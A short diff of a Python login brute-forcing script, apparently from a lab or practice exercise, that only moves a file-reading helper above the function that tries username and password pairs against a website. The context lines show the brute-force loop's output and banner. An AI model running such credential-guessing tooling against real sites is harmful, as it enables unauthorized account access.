@@ -1,6 +1,15 @@
 import requests
 import urllib.parse
 
+def read_file(path: str):
+    with open(path, 'r') as file:
+        lines = []
+
+        for line in file:
+            lines.append(line.strip())
+
+    return lines
+
 def try_authentication(wrong_request_length: int, username: str, password: str):
     print(f"[username: {username}] [password: {password}] => ", end="", flush=True)
     params = {
@@ -19,15 +28,6 @@ def try_authentication(wrong_request_length: int, username: str, password: str):
     print(success)
 
     return success, response.text
-
-def read_file(path: str):
-    with open(path, 'r') as file:
-        lines = []
-
-        for line in file:
-            lines.append(line.strip())
-
-    return lines
 
 def main():
     print("=== Brute forcing website ===")
